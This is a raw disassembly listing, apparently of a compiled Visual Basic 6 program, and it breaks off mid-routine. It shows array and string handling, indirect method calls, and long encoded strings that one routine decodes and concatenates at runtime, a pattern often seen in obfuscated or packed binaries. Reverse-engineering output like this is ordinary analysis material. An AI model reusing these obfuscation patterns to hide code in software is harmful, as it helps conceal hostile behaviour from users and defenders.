.text:0040824B loc_40824B:                             ; CODE XREF: .text:00401AA1↑j
.text:0040824B                 push    ebp
.text:0040824C                 mov     ebp, esp
.text:0040824E                 sub     esp, 0Ch
.text:00408251                 push    offset __vbaExceptHandler
.text:00408256                 mov     eax, large fs:0
.text:0040825C                 push    eax
.text:0040825D                 mov     large fs:0, esp
.text:00408264                 push    60h ; '`'
.text:00408266                 pop     eax
.text:00408267                 call    __vbaChkstk
.text:0040826C                 push    ebx
.text:0040826D                 push    esi
.text:0040826E                 push    edi
.text:0040826F                 mov     [ebp-0Ch], esp
.text:00408272                 mov     dword ptr [ebp-8], offset dword_401178
.text:00408279                 mov     dword ptr [ebp-4], 0
.text:00408280                 mov     eax, [ebp+8]
.text:00408283                 mov     eax, [eax]
.text:00408285                 push    dword ptr [ebp+8]
.text:00408288                 call    dword ptr [eax+4]
.text:0040828B                 mov     eax, [ebp+0Ch]
.text:0040828E                 push    dword ptr [eax]
.text:00408290                 lea     eax, [ebp-18h]
.text:00408293                 push    eax
.text:00408294                 call    __vbaAryLock
.text:00408299                 push    1
.text:0040829B                 push    1
.text:0040829D                 mov     eax, [ebp-18h]
.text:004082A0                 xor     ecx, ecx
.text:004082A2                 sub     ecx, [eax+14h]
.text:004082A5                 mov     eax, [ebp-18h]
.text:004082A8                 mov     eax, [eax+0Ch]
.text:004082AB                 add     eax, ecx
.text:004082AD                 push    eax
.text:004082AE                 call    sub_40A4A1
.text:004082B3                 mov     [ebp-40h], eax
.text:004082B6                 lea     eax, [ebp-18h]
.text:004082B9                 push    eax
.text:004082BA                 call    __vbaAryUnlock
.text:004082BF                 mov     eax, [ebp+0Ch]
.text:004082C2                 mov     eax, [eax]
.text:004082C4                 mov     [ebp-24h], eax
.text:004082C7                 mov     dword ptr [ebp-2Ch], 2011h
.text:004082CE                 lea     eax, [ebp-44h]
.text:004082D1                 push    eax
.text:004082D2                 push    10h
.text:004082D4                 pop     eax
.text:004082D5                 call    __vbaChkstk
.text:004082DA                 lea     esi, [ebp-2Ch]
.text:004082DD                 mov     edi, esp
.text:004082DF                 movsd
.text:004082E0                 movsd
.text:004082E1                 movsd
.text:004082E2                 movsd
.text:004082E3                 mov     eax, [ebp+8]
.text:004082E6                 mov     eax, [eax]
.text:004082E8                 push    dword ptr [ebp+8]
.text:004082EB                 call    dword ptr [eax+38h]
.text:004082EE                 mov     [ebp-58h], eax
.text:004082F1                 cmp     dword ptr [ebp-58h], 0
.text:004082F5                 jge     short loc_40830E
.text:004082F7                 push    38h ; '8'
.text:004082F9                 push    offset dword_4027CC
.text:004082FE                 push    dword ptr [ebp+8]
.text:00408301                 push    dword ptr [ebp-58h]
.text:00408304                 call    __vbaHresultCheckObj
.text:00408309                 mov     [ebp-6Ch], eax
.text:0040830C                 jmp     short loc_408312
.text:0040830E ; ---------------------------------------------------------------------------
.text:0040830E
.text:0040830E loc_40830E:                             ; CODE XREF: .text:004082F5↑j
.text:0040830E                 and     dword ptr [ebp-6Ch], 0
.text:00408312
.text:00408312 loc_408312:                             ; CODE XREF: .text:0040830C↑j
.text:00408312                 mov     eax, [ebp+10h]
.text:00408315                 push    dword ptr [eax]
.text:00408317                 lea     eax, [ebp-1Ch]
.text:0040831A                 push    eax
.text:0040831B                 call    __vbaAryLock
.text:00408320                 push    1
.text:00408322                 push    1
.text:00408324                 mov     eax, [ebp-1Ch]
.text:00408327                 xor     ecx, ecx
.text:00408329                 sub     ecx, [eax+14h]
.text:0040832C                 mov     eax, [ebp-1Ch]
.text:0040832F                 mov     eax, [eax+0Ch]
.text:00408332                 add     eax, ecx
.text:00408334                 push    eax
.text:00408335                 call    sub_40A4A1
.text:0040833A                 mov     [ebp-48h], eax
.text:0040833D                 lea     eax, [ebp-1Ch]
.text:00408340                 push    eax
.text:00408341                 call    __vbaAryUnlock
.text:00408346                 mov     eax, [ebp+10h]
.text:00408349                 mov     eax, [eax]
.text:0040834B                 mov     [ebp-34h], eax
.text:0040834E                 mov     dword ptr [ebp-3Ch], 2011h
.text:00408355                 lea     eax, [ebp-4Ch]
.text:00408358                 push    eax
.text:00408359                 push    10h
.text:0040835B                 pop     eax
.text:0040835C                 call    __vbaChkstk
.text:00408361                 lea     esi, [ebp-3Ch]
.text:00408364                 mov     edi, esp
.text:00408366                 movsd
.text:00408367                 movsd
.text:00408368                 movsd
.text:00408369                 movsd
.text:0040836A                 mov     eax, [ebp+8]
.text:0040836D                 mov     eax, [eax]
.text:0040836F                 push    dword ptr [ebp+8]
.text:00408372                 call    dword ptr [eax+38h]
.text:00408375                 mov     [ebp-5Ch], eax
.text:00408378                 cmp     dword ptr [ebp-5Ch], 0
.text:0040837C                 jge     short loc_408395
.text:0040837E                 push    38h ; '8'
.text:00408380                 push    offset dword_4027CC
.text:00408385                 push    dword ptr [ebp+8]
.text:00408388                 push    dword ptr [ebp-5Ch]
.text:0040838B                 call    __vbaHresultCheckObj
.text:00408390                 mov     [ebp-70h], eax
.text:00408393                 jmp     short loc_408399
.text:00408395 ; ---------------------------------------------------------------------------
.text:00408395
.text:00408395 loc_408395:                             ; CODE XREF: .text:0040837C↑j
.text:00408395                 and     dword ptr [ebp-70h], 0
.text:00408399
.text:00408399 loc_408399:                             ; CODE XREF: .text:00408393↑j
.text:00408399                 mov     eax, [ebp-4Ch]
.text:0040839C                 add     eax, 1
.text:0040839F                 jo      loc_40842E
.text:004083A5                 mov     [ebp-50h], eax
.text:004083A8                 lea     eax, [ebp-54h]
.text:004083AB                 push    eax
.text:004083AC                 lea     eax, [ebp-50h]
.text:004083AF                 push    eax
.text:004083B0                 push    dword ptr [ebp-48h]
.text:004083B3                 mov     eax, [ebp-44h]
.text:004083B6                 add     eax, 1
.text:004083B9                 jo      short loc_40842E
.text:004083BB                 push    eax
.text:004083BC                 push    dword ptr [ebp-40h]
.text:004083BF                 mov     eax, [ebp+8]
.text:004083C2                 push    dword ptr [eax+70h]
.text:004083C5                 mov     eax, [ebp+8]
.text:004083C8                 mov     eax, [eax]
.text:004083CA                 push    dword ptr [ebp+8]
.text:004083CD                 call    dword ptr [eax+1Ch]
.text:004083D0                 mov     [ebp-60h], eax
.text:004083D3                 cmp     dword ptr [ebp-60h], 0
.text:004083D7                 jge     short loc_4083F0
.text:004083D9                 push    1Ch
.text:004083DB                 push    offset dword_4027CC
.text:004083E0                 push    dword ptr [ebp+8]
.text:004083E3                 push    dword ptr [ebp-60h]
.text:004083E6                 call    __vbaHresultCheckObj
.text:004083EB                 mov     [ebp-74h], eax
.text:004083EE                 jmp     short loc_4083F4
.text:004083F0 ; ---------------------------------------------------------------------------
.text:004083F0
.text:004083F0 loc_4083F0:                             ; CODE XREF: .text:004083D7↑j
.text:004083F0                 and     dword ptr [ebp-74h], 0
.text:004083F4
.text:004083F4 loc_4083F4:                             ; CODE XREF: .text:004083EE↑j
.text:004083F4                 push    offset loc_40840F
.text:004083F9                 jmp     short loc_40840E
.text:004083FB ; ---------------------------------------------------------------------------
.text:004083FB
.text:004083FB loc_4083FB:                             ; DATA XREF: .text:00401184↑o
.text:004083FB                 lea     eax, [ebp-18h]
.text:004083FE                 push    eax
.text:004083FF                 call    __vbaAryUnlock
.text:00408404                 lea     eax, [ebp-1Ch]
.text:00408407                 push    eax
.text:00408408                 call    __vbaAryUnlock
.text:0040840D                 retn
.text:0040840E ; ---------------------------------------------------------------------------
.text:0040840E
.text:0040840E loc_40840E:                             ; CODE XREF: .text:004083F9↑j
.text:0040840E                 retn
.text:0040840F ; ---------------------------------------------------------------------------
.text:0040840F
.text:0040840F loc_40840F:                             ; CODE XREF: .text:loc_40840E↑j
.text:0040840F                                         ; DATA XREF: .text:loc_4083F4↑o
.text:0040840F                 mov     eax, [ebp+8]
.text:00408412                 mov     eax, [eax]
.text:00408414                 push    dword ptr [ebp+8]
.text:00408417                 call    dword ptr [eax+8]
.text:0040841A                 mov     eax, [ebp-4]
.text:0040841D                 mov     ecx, [ebp-14h]
.text:00408420                 mov     large fs:0, ecx
.text:00408427                 pop     edi
.text:00408428                 pop     esi
.text:00408429                 pop     ebx
.text:0040842A                 leave
.text:0040842B                 retn    14h
.text:0040842E ; ---------------------------------------------------------------------------
.text:0040842E
.text:0040842E loc_40842E:                             ; CODE XREF: .text:0040839F↑j
.text:0040842E                                         ; .text:004083B9↑j
.text:0040842E                 call    __vbaErrorOverflow
.text:00408433 ; ---------------------------------------------------------------------------
.text:00408433
.text:00408433 loc_408433:                             ; CODE XREF: .text:00401AAE↑j
.text:00408433                 push    ebp
.text:00408434                 mov     ebp, esp
.text:00408436                 push    ecx
.text:00408437                 push    ecx
.text:00408438                 push    offset __vbaExceptHandler
.text:0040843D                 mov     eax, large fs:0
.text:00408443                 push    eax
.text:00408444                 mov     large fs:0, esp
.text:0040844B                 push    1Ch
.text:0040844D                 pop     eax
.text:0040844E                 call    __vbaChkstk
.text:00408453                 push    ebx
.text:00408454                 push    esi
.text:00408455                 push    edi
.text:00408456                 mov     [ebp-8], esp
.text:00408459                 mov     dword ptr [ebp-4], offset dword_401188
.text:00408460                 mov     edx, [ebp+0Ch]
.text:00408463                 lea     ecx, [ebp-18h]
.text:00408466                 call    __vbaStrCopy
.text:0040846B                 push    0
.text:0040846D                 push    dword ptr [ebp-18h]
.text:00408470                 call    sub_40D139
.text:00408475                 push    eax
.text:00408476                 push    1
.text:00408478                 push    11h
.text:0040847A                 push    dword ptr [ebp+10h]
.text:0040847D                 push    1
.text:0040847F                 push    80h
.text:00408484                 call    __vbaRedim
.text:00408489                 add     esp, 1Ch
.text:0040848C                 mov     eax, [ebp+10h]
.text:0040848F                 push    dword ptr [eax]
.text:00408491                 lea     eax, [ebp-1Ch]
.text:00408494                 push    eax
.text:00408495                 call    __vbaAryLock
.text:0040849A                 push    1
.text:0040849C                 push    1
.text:0040849E                 mov     eax, [ebp-1Ch]
.text:004084A1                 xor     ecx, ecx
.text:004084A3                 sub     ecx, [eax+14h]
.text:004084A6                 mov     eax, [ebp-1Ch]
.text:004084A9                 mov     eax, [eax+0Ch]
.text:004084AC                 add     eax, ecx
.text:004084AE                 push    eax
.text:004084AF                 call    sub_40A4A1
.text:004084B4                 mov     [ebp-24h], eax
.text:004084B7                 lea     eax, [ebp-1Ch]
.text:004084BA                 push    eax
.text:004084BB                 call    __vbaAryUnlock
.text:004084C0                 push    dword ptr [ebp-18h]
.text:004084C3                 call    sub_40D139
.text:004084C8                 mov     [ebp-28h], eax
.text:004084CB                 push    0
.text:004084CD                 push    dword ptr [ebp-28h]
.text:004084D0                 push    dword ptr [ebp-18h]
.text:004084D3                 lea     eax, [ebp-20h]
.text:004084D6                 push    eax
.text:004084D7                 call    __vbaStrToAnsi
.text:004084DC                 push    eax
.text:004084DD                 push    dword ptr [ebp-24h]
.text:004084E0                 push    0FFFFFFFFh
.text:004084E2                 call    sub_4029F8
.text:004084E7                 call    __vbaSetSystemError
.text:004084EC                 push    dword ptr [ebp-20h]
.text:004084EF                 lea     eax, [ebp-18h]
.text:004084F2                 push    eax
.text:004084F3                 call    __vbaStrToUnicode
.text:004084F8                 lea     ecx, [ebp-20h]
.text:004084FB                 call    __vbaFreeStr
.text:00408500                 push    offset sub_408522
.text:00408505                 jmp     short loc_408519
.text:00408507 ; ---------------------------------------------------------------------------
.text:00408507
.text:00408507 loc_408507:                             ; DATA XREF: .text:00401194↑o
.text:00408507                 lea     eax, [ebp-1Ch]
.text:0040850A                 push    eax
.text:0040850B                 call    __vbaAryUnlock
.text:00408510                 lea     ecx, [ebp-20h]
.text:00408513                 call    __vbaFreeStr
.text:00408518                 retn
.text:00408519 ; ---------------------------------------------------------------------------
.text:00408519
.text:00408519 loc_408519:                             ; CODE XREF: .text:00408505↑j
.text:00408519                                         ; DATA XREF: .text:00401190↑o
.text:00408519                 lea     ecx, [ebp-18h]
.text:0040851C                 call    __vbaFreeStr
.text:00408521                 retn
.text:00408522
.text:00408522 ; =============== S U B R O U T I N E =======================================
.text:00408522
.text:00408522
.text:00408522 sub_408522      proc near               ; DATA XREF: .text:00408500↑o
.text:00408522                 xor     eax, eax
.text:00408524                 mov     ecx, [ebp-10h]
.text:00408527                 mov     large fs:0, ecx
.text:0040852E                 pop     edi
.text:0040852F                 pop     esi
.text:00408530                 pop     ebx
.text:00408531                 leave
.text:00408532                 retn    0Ch
.text:00408532 sub_408522      endp ; sp-analysis failed
.text:00408532
.text:00408535 ; ---------------------------------------------------------------------------
.text:00408535
.text:00408535 loc_408535:                             ; CODE XREF: .text:00401ABB↑j
.text:00408535                 push    ebp
.text:00408536                 mov     ebp, esp
.text:00408538                 sub     esp, 0Ch
.text:0040853B                 push    offset __vbaExceptHandler
.text:00408540                 mov     eax, large fs:0
.text:00408546                 push    eax
.text:00408547                 mov     large fs:0, esp
.text:0040854E                 push    50h ; 'P'
.text:00408550                 pop     eax
.text:00408551                 call    __vbaChkstk
.text:00408556                 push    ebx
.text:00408557                 push    esi
.text:00408558                 push    edi
.text:00408559                 mov     [ebp-0Ch], esp
.text:0040855C                 mov     dword ptr [ebp-8], offset dword_401198
.text:00408563                 mov     dword ptr [ebp-4], 0
.text:0040856A                 mov     eax, [ebp+8]
.text:0040856D                 mov     eax, [eax]
.text:0040856F                 push    dword ptr [ebp+8]
.text:00408572                 call    dword ptr [eax+4]
.text:00408575                 mov     edx, [ebp+0Ch]
.text:00408578                 lea     ecx, [ebp-2Ch]
.text:0040857B                 call    __vbaStrCopy
.text:00408580                 mov     edx, [ebp+10h]
.text:00408583                 lea     ecx, [ebp-28h]
.text:00408586                 call    __vbaStrCopy
.text:0040858B                 push    0
.text:0040858D                 push    9
.text:0040858F                 push    1
.text:00408591                 push    3
.text:00408593                 lea     eax, [ebp-24h]
.text:00408596                 push    eax
.text:00408597                 push    4
.text:00408599                 push    80h
.text:0040859E                 call    __vbaRedim
.text:004085A3                 add     esp, 1Ch
.text:004085A6                 mov     eax, [ebp-24h]
.text:004085A9                 xor     ecx, ecx
.text:004085AB                 sub     ecx, [eax+14h]
.text:004085AE                 mov     eax, [ebp-24h]
.text:004085B1                 mov     eax, [eax+0Ch]
.text:004085B4                 mov     edx, [ebp+14h]
.text:004085B7                 mov     edx, [edx]
.text:004085B9                 mov     [eax+ecx*4], edx
.text:004085BC                 mov     eax, [ebp-24h]
.text:004085BF                 push    1
.text:004085C1                 pop     ecx
.text:004085C2                 sub     ecx, [eax+14h]
.text:004085C5                 mov     eax, [ebp-24h]
.text:004085C8                 mov     eax, [eax+0Ch]
.text:004085CB                 mov     edx, [ebp+18h]
.text:004085CE                 mov     edx, [edx]
.text:004085D0                 mov     [eax+ecx*4], edx
.text:004085D3                 mov     eax, [ebp-24h]
.text:004085D6                 push    2
.text:004085D8                 pop     ecx
.text:004085D9                 sub     ecx, [eax+14h]
.text:004085DC                 mov     eax, [ebp-24h]
.text:004085DF                 mov     eax, [eax+0Ch]
.text:004085E2                 mov     edx, [ebp+1Ch]
.text:004085E5                 mov     edx, [edx]
.text:004085E7                 mov     [eax+ecx*4], edx
.text:004085EA                 mov     eax, [ebp-24h]
.text:004085ED                 push    3
.text:004085EF                 pop     ecx
.text:004085F0                 sub     ecx, [eax+14h]
.text:004085F3                 mov     eax, [ebp-24h]
.text:004085F6                 mov     eax, [eax+0Ch]
.text:004085F9                 mov     edx, [ebp+20h]
.text:004085FC                 mov     edx, [edx]
.text:004085FE                 mov     [eax+ecx*4], edx
.text:00408601                 mov     eax, [ebp-24h]
.text:00408604                 push    4
.text:00408606                 pop     ecx
.text:00408607                 sub     ecx, [eax+14h]
.text:0040860A                 mov     eax, [ebp-24h]
.text:0040860D                 mov     eax, [eax+0Ch]
.text:00408610                 mov     edx, [ebp+24h]
.text:00408613                 mov     edx, [edx]
.text:00408615                 mov     [eax+ecx*4], edx
.text:00408618                 mov     eax, [ebp-24h]
.text:0040861B                 push    5
.text:0040861D                 pop     ecx
.text:0040861E                 sub     ecx, [eax+14h]
.text:00408621                 mov     eax, [ebp-24h]
.text:00408624                 mov     eax, [eax+0Ch]
.text:00408627                 mov     edx, [ebp+28h]
.text:0040862A                 mov     edx, [edx]
.text:0040862C                 mov     [eax+ecx*4], edx
.text:0040862F                 mov     eax, [ebp-24h]
.text:00408632                 push    6
.text:00408634                 pop     ecx
.text:00408635                 sub     ecx, [eax+14h]
.text:00408638                 mov     eax, [ebp-24h]
.text:0040863B                 mov     eax, [eax+0Ch]
.text:0040863E                 mov     edx, [ebp+2Ch]
.text:00408641                 mov     edx, [edx]
.text:00408643                 mov     [eax+ecx*4], edx
.text:00408646                 mov     eax, [ebp-24h]
.text:00408649                 push    7
.text:0040864B                 pop     ecx
.text:0040864C                 sub     ecx, [eax+14h]
.text:0040864F                 mov     eax, [ebp-24h]
.text:00408652                 mov     eax, [eax+0Ch]
.text:00408655                 mov     edx, [ebp+30h]
.text:00408658                 mov     edx, [edx]
.text:0040865A                 mov     [eax+ecx*4], edx
.text:0040865D                 mov     eax, [ebp-24h]
.text:00408660                 push    8
.text:00408662                 pop     ecx
.text:00408663                 sub     ecx, [eax+14h]
.text:00408666                 mov     eax, [ebp-24h]
.text:00408669                 mov     eax, [eax+0Ch]
.text:0040866C                 mov     edx, [ebp+34h]
.text:0040866F                 mov     edx, [edx]
.text:00408671                 mov     [eax+ecx*4], edx
.text:00408674                 mov     eax, [ebp-24h]
.text:00408677                 push    9
.text:00408679                 pop     ecx
.text:0040867A                 sub     ecx, [eax+14h]
.text:0040867D                 mov     eax, [ebp-24h]
.text:00408680                 mov     eax, [eax+0Ch]
.text:00408683                 mov     edx, [ebp+38h]
.text:00408686                 mov     edx, [edx]
.text:00408688                 mov     [eax+ecx*4], edx
.text:0040868B                 lea     eax, [ebp-20h]
.text:0040868E                 push    eax
.text:0040868F                 push    dword ptr [ebp-2Ch]
.text:00408692                 push    offset dword_402BF8
.text:00408697                 call    __vbaStrCat
.text:0040869C                 mov     edx, eax
.text:0040869E                 lea     ecx, [ebp-40h]
.text:004086A1                 call    __vbaStrMove
.text:004086A6                 push    eax
.text:004086A7                 mov     eax, [ebp+8]
.text:004086AA                 mov     eax, [eax]
.text:004086AC                 push    dword ptr [ebp+8]
.text:004086AF                 call    dword ptr [eax+48h]
.text:004086B2                 lea     ecx, [ebp-40h]
.text:004086B5                 call    __vbaFreeStr
.text:004086BA                 lea     eax, [ebp-1Ch]
.text:004086BD                 push    eax
.text:004086BE                 push    dword ptr [ebp-28h]
.text:004086C1                 push    offset dword_402BF8
.text:004086C6                 call    __vbaStrCat
.text:004086CB                 mov     edx, eax
.text:004086CD                 lea     ecx, [ebp-40h]
.text:004086D0                 call    __vbaStrMove
.text:004086D5                 push    eax
.text:004086D6                 mov     eax, [ebp+8]
.text:004086D9                 mov     eax, [eax]
.text:004086DB                 push    dword ptr [ebp+8]
.text:004086DE                 call    dword ptr [eax+48h]
.text:004086E1                 lea     ecx, [ebp-40h]
.text:004086E4                 call    __vbaFreeStr
.text:004086E9                 push    dword ptr [ebp-20h]
.text:004086EC                 lea     eax, [ebp-34h]
.text:004086EF                 push    eax
.text:004086F0                 call    __vbaAryLock
.text:004086F5                 push    1
.text:004086F7                 push    1
.text:004086F9                 mov     eax, [ebp-34h]
.text:004086FC                 xor     ecx, ecx
.text:004086FE                 sub     ecx, [eax+14h]
.text:00408701                 mov     eax, [ebp-34h]
.text:00408704                 mov     eax, [eax+0Ch]
.text:00408707                 add     eax, ecx
.text:00408709                 push    eax
.text:0040870A                 call    sub_40A4A1
.text:0040870F                 mov     [ebp-44h], eax
.text:00408712                 lea     eax, [ebp-34h]
.text:00408715                 push    eax
.text:00408716                 call    __vbaAryUnlock
.text:0040871B                 push    dword ptr [ebp-1Ch]
.text:0040871E                 lea     eax, [ebp-38h]
.text:00408721                 push    eax
.text:00408722                 call    __vbaAryLock
.text:00408727                 push    1
.text:00408729                 push    1
.text:0040872B                 mov     eax, [ebp-38h]
.text:0040872E                 xor     ecx, ecx
.text:00408730                 sub     ecx, [eax+14h]
.text:00408733                 mov     eax, [ebp-38h]
.text:00408736                 mov     eax, [eax+0Ch]
.text:00408739                 add     eax, ecx
.text:0040873B                 push    eax
.text:0040873C                 call    sub_40A4A1
.text:00408741                 mov     [ebp-48h], eax
.text:00408744                 lea     eax, [ebp-38h]
.text:00408747                 push    eax
.text:00408748                 call    __vbaAryUnlock
.text:0040874D                 push    dword ptr [ebp-24h]
.text:00408750                 lea     eax, [ebp-3Ch]
.text:00408753                 push    eax
.text:00408754                 call    __vbaAryLock
.text:00408759                 push    1
.text:0040875B                 push    1
.text:0040875D                 mov     eax, [ebp-3Ch]
.text:00408760                 push    1
.text:00408762                 pop     ecx
.text:00408763                 sub     ecx, [eax+14h]
.text:00408766                 mov     eax, [ebp-3Ch]
.text:00408769                 mov     eax, [eax+0Ch]
.text:0040876C                 lea     eax, [eax+ecx*4]
.text:0040876F                 push    eax
.text:00408770                 call    sub_40D0DD
.text:00408775                 mov     [ebp-4Ch], eax
.text:00408778                 lea     eax, [ebp-3Ch]
.text:0040877B                 push    eax
.text:0040877C                 call    __vbaAryUnlock
.text:00408781                 mov     eax, [ebp-4Ch]
.text:00408784                 mov     [ebp-50h], eax
.text:00408787                 lea     eax, [ebp-54h]
.text:0040878A                 push    eax
.text:0040878B                 lea     eax, [ebp-50h]
.text:0040878E                 push    eax
.text:0040878F                 mov     eax, [ebp-24h]
.text:00408792                 xor     ecx, ecx
.text:00408794                 sub     ecx, [eax+14h]
.text:00408797                 mov     eax, [ebp-24h]
.text:0040879A                 mov     eax, [eax+0Ch]
.text:0040879D                 push    dword ptr [eax+ecx*4]
.text:004087A0                 push    dword ptr [ebp-48h]
.text:004087A3                 push    dword ptr [ebp-44h]
.text:004087A6                 mov     eax, [ebp+8]
.text:004087A9                 push    dword ptr [eax+74h]
.text:004087AC                 mov     eax, [ebp+8]
.text:004087AF                 mov     eax, [eax]
.text:004087B1                 push    dword ptr [ebp+8]
.text:004087B4                 call    dword ptr [eax+1Ch]
.text:004087B7                 mov     [ebp-58h], eax
.text:004087BA                 cmp     dword ptr [ebp-58h], 0
.text:004087BE                 jge     short loc_4087D7
.text:004087C0                 push    1Ch
.text:004087C2                 push    offset dword_4027CC
.text:004087C7                 push    dword ptr [ebp+8]
.text:004087CA                 push    dword ptr [ebp-58h]
.text:004087CD                 call    __vbaHresultCheckObj
.text:004087D2                 mov     [ebp-64h], eax
.text:004087D5                 jmp     short loc_4087DB
.text:004087D7 ; ---------------------------------------------------------------------------
.text:004087D7
.text:004087D7 loc_4087D7:                             ; CODE XREF: .text:004087BE↑j
.text:004087D7                 and     dword ptr [ebp-64h], 0
.text:004087DB
.text:004087DB loc_4087DB:                             ; CODE XREF: .text:004087D5↑j
.text:004087DB                 mov     eax, [ebp-54h]
.text:004087DE                 mov     [ebp-30h], eax
.text:004087E1                 push    offset sub_40883E
.text:004087E6                 jmp     short loc_40880C
.text:004087E8 ; ---------------------------------------------------------------------------
.text:004087E8                 lea     eax, [ebp-34h]
.text:004087EB                 push    eax
.text:004087EC                 call    __vbaAryUnlock
.text:004087F1                 lea     eax, [ebp-38h]
.text:004087F4                 push    eax
.text:004087F5                 call    __vbaAryUnlock
.text:004087FA                 lea     eax, [ebp-3Ch]
.text:004087FD                 push    eax
.text:004087FE                 call    __vbaAryUnlock
.text:00408803                 lea     ecx, [ebp-40h]
.text:00408806                 call    __vbaFreeStr
.text:0040880B                 retn
.text:0040880C ; ---------------------------------------------------------------------------
.text:0040880C
.text:0040880C loc_40880C:                             ; CODE XREF: .text:004087E6↑j
.text:0040880C                 lea     eax, [ebp-1Ch]
.text:0040880F                 push    eax
.text:00408810                 push    0
.text:00408812                 call    __vbaAryDestruct
.text:00408817                 lea     eax, [ebp-20h]
.text:0040881A                 push    eax
.text:0040881B                 push    0
.text:0040881D                 call    __vbaAryDestruct
.text:00408822                 lea     eax, [ebp-24h]
.text:00408825                 push    eax
.text:00408826                 push    0
.text:00408828                 call    __vbaAryDestruct
.text:0040882D                 lea     ecx, [ebp-28h]
.text:00408830                 call    __vbaFreeStr
.text:00408835                 lea     ecx, [ebp-2Ch]
.text:00408838                 call    __vbaFreeStr
.text:0040883D                 retn
.text:0040883E
.text:0040883E ; =============== S U B R O U T I N E =======================================
.text:0040883E
.text:0040883E
.text:0040883E sub_40883E      proc near               ; DATA XREF: .text:004087E1↑o
.text:0040883E                 mov     eax, [ebp+8]
.text:00408841                 mov     eax, [eax]
.text:00408843                 push    dword ptr [ebp+8]
.text:00408846                 call    dword ptr [eax+8]
.text:00408849                 mov     eax, [ebp+3Ch]
.text:0040884C                 mov     ecx, [ebp-30h]
.text:0040884F                 mov     [eax], ecx
.text:00408851                 mov     eax, [ebp-4]
.text:00408854                 mov     ecx, [ebp-14h]
.text:00408857                 mov     large fs:0, ecx
.text:0040885E                 pop     edi
.text:0040885F                 pop     esi
.text:00408860                 pop     ebx
.text:00408861                 leave
.text:00408862                 retn    38h ; '8'
.text:00408862 sub_40883E      endp ; sp-analysis failed
.text:00408862
.text:00408865 ; ---------------------------------------------------------------------------
.text:00408865
.text:00408865 loc_408865:                             ; CODE XREF: .text:00401AC8↑j
.text:00408865                 push    ebp
.text:00408866                 mov     ebp, esp
.text:00408868                 sub     esp, 0Ch
.text:0040886B                 push    offset __vbaExceptHandler
.text:00408870                 mov     eax, large fs:0
.text:00408876                 push    eax
.text:00408877                 mov     large fs:0, esp
.text:0040887E                 mov     eax, 0D4h
.text:00408883                 call    __vbaChkstk
.text:00408888                 push    ebx
.text:00408889                 push    esi
.text:0040888A                 push    edi
.text:0040888B                 mov     [ebp-0Ch], esp
.text:0040888E                 mov     dword ptr [ebp-8], offset dword_401228
.text:00408895                 mov     dword ptr [ebp-4], 0
.text:0040889C                 mov     eax, [ebp+8]
.text:0040889F                 mov     eax, [eax]
.text:004088A1                 push    dword ptr [ebp+8]
.text:004088A4                 call    dword ptr [eax+4]
.text:004088A7                 fld     ds:flt_401220
.text:004088AD                 fstp    dword ptr [ebp-20h]
.text:004088B0                 lea     eax, [ebp-18h]
.text:004088B3                 push    eax
.text:004088B4                 push    0
.text:004088B6                 lea     eax, [ebp-20h]
.text:004088B9                 push    eax
.text:004088BA                 push    offset aG8286858f91849 ; "g8286858f9184937d7e8281868585917e7d7d7e"...
.text:004088BF                 mov     eax, [ebp+8]
.text:004088C2                 mov     eax, [eax]
.text:004088C4                 push    dword ptr [ebp+8]
.text:004088C7                 call    dword ptr [eax+24h]
.text:004088CA                 mov     [ebp-2Ch], eax
.text:004088CD                 cmp     dword ptr [ebp-2Ch], 0
.text:004088D1                 jge     short loc_4088EA
.text:004088D3                 push    24h ; '$'
.text:004088D5                 push    offset dword_4027CC
.text:004088DA                 push    dword ptr [ebp+8]
.text:004088DD                 push    dword ptr [ebp-2Ch]
.text:004088E0                 call    __vbaHresultCheckObj
.text:004088E5                 mov     [ebp-4Ch], eax
.text:004088E8                 jmp     short loc_4088EE
.text:004088EA ; ---------------------------------------------------------------------------
.text:004088EA
.text:004088EA loc_4088EA:                             ; CODE XREF: .text:004088D1↑j
.text:004088EA                 and     dword ptr [ebp-4Ch], 0
.text:004088EE
.text:004088EE loc_4088EE:                             ; CODE XREF: .text:004088E8↑j
.text:004088EE                 mov     edx, [ebp-18h]
.text:004088F1                 mov     ecx, [ebp+8]
.text:004088F4                 add     ecx, 70h ; 'p'
.text:004088F7                 call    __vbaStrCopy
.text:004088FC                 lea     ecx, [ebp-18h]
.text:004088FF                 call    __vbaFreeStr
.text:00408904                 fld     ds:flt_40121C
.text:0040890A                 fstp    dword ptr [ebp-20h]
.text:0040890D                 lea     eax, [ebp-18h]
.text:00408910                 push    eax
.text:00408911                 push    0
.text:00408913                 lea     eax, [ebp-20h]
.text:00408916                 push    eax
.text:00408917                 push    offset a51515152536465 ; "_515151525364655664665a5963566656675651"...
.text:0040891C                 mov     eax, [ebp+8]
.text:0040891F                 mov     eax, [eax]
.text:00408921                 push    dword ptr [ebp+8]
.text:00408924                 call    dword ptr [eax+24h]
.text:00408927                 mov     [ebp-2Ch], eax
.text:0040892A                 cmp     dword ptr [ebp-2Ch], 0
.text:0040892E                 jge     short loc_408947
.text:00408930                 push    24h ; '$'
.text:00408932                 push    offset dword_4027CC
.text:00408937                 push    dword ptr [ebp+8]
.text:0040893A                 push    dword ptr [ebp-2Ch]
.text:0040893D                 call    __vbaHresultCheckObj
.text:00408942                 mov     [ebp-50h], eax
.text:00408945                 jmp     short loc_40894B
.text:00408947 ; ---------------------------------------------------------------------------
.text:00408947
.text:00408947 loc_408947:                             ; CODE XREF: .text:0040892E↑j
.text:00408947                 and     dword ptr [ebp-50h], 0
.text:0040894B
.text:0040894B loc_40894B:                             ; CODE XREF: .text:00408945↑j
.text:0040894B                 mov     eax, [ebp+8]
.text:0040894E                 push    dword ptr [eax+70h]
.text:00408951                 push    dword ptr [ebp-18h]
.text:00408954                 call    __vbaStrCat
.text:00408959                 mov     edx, eax
.text:0040895B                 lea     ecx, [ebp-1Ch]
.text:0040895E                 call    __vbaStrMove
.text:00408963                 mov     edx, eax
.text:00408965                 mov     ecx, [ebp+8]
.text:00408968                 add     ecx, 70h ; 'p'
.text:0040896B                 call    __vbaStrCopy
.text:00408970                 lea     eax, [ebp-1Ch]
.text:00408973                 push    eax
.text:00408974                 lea     eax, [ebp-18h]
.text:00408977                 push    eax
.text:00408978                 push    2
.text:0040897A                 call    __vbaFreeStrList
.text:0040897F                 add     esp, 0Ch
.text:00408982                 fld     ds:flt_401218
.text:00408988                 fstp    dword ptr [ebp-20h]
.text:0040898B                 lea     eax, [ebp-18h]
.text:0040898E                 push    eax
.text:0040898F                 push    0
.text:00408991                 lea     eax, [ebp-20h]
.text:00408994                 push    eax
